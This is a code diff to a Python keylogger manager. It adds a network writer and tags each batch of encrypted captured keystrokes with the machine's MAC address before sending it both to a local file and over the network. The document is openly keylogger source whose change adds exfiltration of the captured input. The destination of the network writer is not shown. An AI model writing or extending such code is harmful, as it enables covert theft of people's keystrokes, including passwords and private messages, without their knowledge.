@@ -1,13 +1,18 @@
+import uuid
+
 from encryption.encryption import Encryption
 from keylogger.new_keylogger import KeyloggerService
-import threading
 from writer.FileWriter import FileWriter
+from writer.NetWorkWriter import NetWorkWriter
 from time import sleep
 from datetime import datetime
+import uuid
 
 class KeyLoggerManager:
     def __init__(self):
-        self.writer = FileWriter()
+        self.mac_address = hex(uuid.getnode())
+        self.file_writer = FileWriter()
+        self.netWork_writer = NetWorkWriter()
         self.keylogger = KeyloggerService()
         self.encoder = Encryption(None, open('key.txt', 'r').read())
         self.flag = True
@@ -32,7 +37,8 @@ class KeyLoggerManager:
                     self.flag = False
                     return
                 encrypted_data = self.encoder.encryption()
-                self.writer.send_data(encrypted_data)
+                self.file_writer.send_data(encrypted_data, self.mac_address)
+                self.netWork_writer.send_data(encrypted_data, self.mac_address)
 
             except Exception as e:
                 print(e)
@@ -44,6 +50,7 @@ def main():
     key_logger = KeyLoggerManager()
     key_logger.start()
     key_logger.handle_logging()
+
 
 
 if __name__ == "__main__":
